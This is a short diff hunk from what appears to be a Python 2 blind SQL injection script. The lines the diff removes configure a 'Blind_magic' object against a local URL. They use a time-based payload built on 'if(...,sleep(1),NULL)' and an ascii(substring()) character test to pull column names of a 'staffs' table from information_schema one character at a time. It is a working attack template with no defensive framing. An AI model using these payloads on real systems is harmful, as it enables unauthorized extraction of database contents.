@@ -88,13 +88,3 @@ File "%(filename)s", line %(lineno)s, in %(name)s
                             result = result + new_result
                         self.result.append(result)
                         result = ''
-
-
-blind_magic = Blind_magic()
-blind_magic.l(1,0,0,0,0,10,3,0,0,0)
-blind_magic.url = "http://10.0.42.224/?q="
-blind_magic.base_query = "if(({CONDITION_QUERY}),sleep(1),NULL)"
-blind_magic.condition_query = "ascii(substring(({QUERY}),{l1},1)){OPERATOR}{CHAR}"
-blind_magic.query = "Select column_name from information_schema.columns where table_name='staffs' limit {l2},1"
-blind_magic.run()
-print blind_magic.result
